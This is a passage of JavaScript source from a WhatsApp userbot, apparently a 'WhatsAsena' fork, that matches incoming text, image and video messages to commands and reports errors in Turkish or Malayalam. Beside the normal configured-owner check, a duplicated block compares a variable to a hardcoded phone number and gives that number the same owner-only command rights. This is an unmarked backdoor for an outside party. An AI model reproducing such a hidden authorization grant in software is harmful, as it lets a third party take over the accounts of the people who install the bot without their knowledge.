                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "905511384572,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
/*
                        if (msg.key.fromMe && command.deleteCommand) { 
                            var wrs = conn.user.phone.wa_version.split('.')[2]
                            if (wrs < 11) {
                                await whats.delete() 
                            }
                        } 
*/
                        // ==================== End Message Catcher ====================

                        try {
                            await command.function(whats, match);
                        } catch (error) {
                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                await conn.sendMessage(conn.user.jid, '-- HATA RAPORU [WHATSASENA] --' + 
                                    '\n*WhatsAsena bir hata gerçekleşti!*'+
                                    '\n_Bu hata logunda numaranız veya karşı bir tarafın numarası olabilir. Lütfen buna dikkat edin!_' +
                                    '\n_Yardım için Telegram grubumuza yazabilirsiniz._' +
                                    '\n_Bu mesaj sizin numaranıza (kaydedilen mesajlar) gitmiş olmalıdır._\n\n' +
                                    'Gerçekleşen Hata: ' + error + '\n\n'
                                    , MessageType.text);
                            } else {
                                await conn.sendMessage(conn.user.jid, '*~_________~ ʀᴀɢᷨᴀͦɴͭᴏʀᴋ ~______~*' +
                                    '\n\n*🥲 ' + error + '*\n\n' + 'Error onnum kandu pedikkanda. seen illa nenbaa 💖'
                                    , MessageType.text);
                            }
                        }
                    }
                }
            }
        )
    });

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Eski sürüm stringiniz yenileniyor...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

whatsAsena();
